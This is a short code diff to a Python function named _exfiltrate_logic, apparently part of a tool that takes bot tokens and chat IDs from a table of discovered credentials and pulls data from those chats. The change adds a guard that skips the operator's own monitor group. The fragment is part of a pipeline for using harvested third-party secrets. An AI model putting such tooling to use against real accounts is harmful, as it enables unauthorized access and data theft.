@@ -81,8 +81,20 @@ async def _exfiltrate_logic(cred_id: str):
     record = response.data[0]
     encrypted_token = record["bot_token"]
     chat_id = record["chat_id"]
-    
+
     logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
+
+    # Guard: never exfiltrate the monitor hub — circular scrape protection.
+    # MONITOR_GROUP_ID may be a @username; compare against resolved numeric ID too.
+    from app.services.scraper_srv import _is_monitor_group
+    if chat_id and _is_monitor_group(chat_id):
+        logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
+        await async_execute(
+            db.table("discovered_credentials")
+            .update({"chat_id": None})
+            .eq("id", cred_id)
+        )
+        return f"Skipped: chat_id {chat_id} is monitor hub — cleared."
     
     # Decrypt or Handle Legacy/Raw
     try:
